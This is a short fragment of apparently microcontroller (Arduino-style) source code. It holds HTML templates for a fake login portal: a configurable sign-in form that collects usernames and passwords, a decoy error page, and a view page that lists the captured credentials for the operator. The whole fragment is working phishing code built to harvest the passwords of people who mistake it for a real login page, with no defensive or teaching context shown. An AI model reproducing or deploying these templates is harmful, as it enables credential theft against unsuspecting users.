
String IServHTML = ""
                      "<!DOCTYPE html><html><head></head><body><div class='login'>"
                      "<div class='form'><h3>" + Title + "</h3><form action='/error' method='POST'><input type='text' name='username' placeholder='" + userNamePlaceholder + "' required><br><br><input type='text' name='password' placeholder='" + pwdPlaceholder + "' required>"
                      "<br><br><button type='submit'>" + Button + "</button><br><br></form></div></div><style>html{font-family: sans-serif;}h3{font-family: Open Sans,Arial,sans-serif;font-size: 14px;font-weight: 400;}.login {border: 1px solid #dee2e9;margin: 20px auto;background-color: #f6f6f6;width: 100%;max-width: 400px;text-align: left;}input{background-color: white;border: 1px solid #dee2e9;border-radius: 2px;box-shadow: inset 0 1px 1px rgba(0,0,0,.075);padding: 8px;width: 85%;}.form{position: relative;left: 5%;}button{background-color: #0974de;border-color: transparent;color: #fff;cursor: pointer;font-size: 14px;padding: 5px;width: 25%;border-radius: 2px;}</style></body></html>";

String ErrorHTML=""
                 "<!DOCTYPE html><html><head></head><body><h1>" + errorMessage + "</h1></body></html>";

String viewHTML=""
                "<!DOCTYPE html><html><head></head><body><p>" + usernames + "</p><br></br><p>" + passwords + "</p></body></html>";
